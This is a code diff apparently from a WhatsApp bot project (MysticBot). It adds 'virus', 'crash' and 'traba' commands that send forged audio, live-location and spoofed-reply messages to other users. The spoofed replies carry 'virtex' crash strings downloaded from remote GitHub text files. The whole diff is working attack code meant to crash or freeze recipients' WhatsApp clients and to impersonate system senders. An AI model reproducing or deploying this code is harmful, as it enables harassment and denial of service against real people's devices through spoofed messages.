@@ -11,7 +11,10 @@ let virtex1 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/p
 let virtex2 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/2.txt').then(v => v.text());
 let virtex3 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/3.txt').then(v => v.text());
 let virtex4 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/4.txt').then(v => v.text());
-let virtex5 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/ShadowBotV3-OBSOLETO/master/lib/Binario.txt').then(v => v.text());    
+let virtex5 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/ShadowBotV3-OBSOLETO/master/lib/Binario.txt').then(v => v.text()); 
+let virtex6 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/TheMystic-Bot-MD/master/src/trabas/traba1.txt').then(v => v.text());
+let virtex7 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/TheMystic-Bot-MD/master/src/trabas/traba2.txt').then(v => v.text());
+let virtex8 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/TheMystic-Bot-MD/master/src/trabas/traba3.txt').then(v => v.text());
     
 switch (command) {
     
@@ -39,8 +42,41 @@ var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR",
 }}), { userJid: from, quoted: doc })
-conn.relayMessage(from, order.message, { messageId: order.key.id })} 
-break        
+await conn.relayMessage(from, order.message, { messageId: order.key.id })} 
+break 
+case 'virus3': case 'c3': case 'binario3': case 'traba3': case 'crash3': {
+var audio = generateWAMessageFromContent(from, proto.Message.fromObject({
+"audioMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
+"mimetype": "audio/mpeg",
+"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
+"fileLength": "258330",
+"seconds": 16,
+"ptt": false,
+"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
+"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
+"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
+"mediaKeyTimestamp": "1657190832",
+}}), { userJid: from, quoted: doc })
+await conn.relayMessage(from, audio.message, { messageId: audio.key.id })} 
+break   
+case 'virus4': case 'c4': case 'binario4': case 'traba4': case 'crash4': {
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./Menu2.jpg') }, { upload: conn.waUploadToServer })
+var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
+"liveLocationMessage": {
+"degreesLatitude": -6.9367014,
+"degreesLongitude": 107.7228574,
+"caption": `© MysticBot`,
+"sequenceNumber": "1657237469254001",
+"jpegThumbnail": imagen4,
+}}), { userJid: from, quoted: doc })
+await conn.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })} 
+break 
+case 'virus5': case 'c5': case 'binario5': case 'traba5': case 'crash5': {
+conn.fakeReply(from, virtex6, '0@s.whatsapp.net', '🔥 *By MysticBot* 🔥', 'status@broadcast')
+conn.fakeReply(from, virtex7, '0@s.whatsapp.net', '🔥 *By MysticBot* 🔥', 'status@broadcast')
+conn.fakeReply(from, virtex8, '0@s.whatsapp.net', '🔥 *By MysticBot* 🔥', 'status@broadcast')}
+break                                
     
 
     
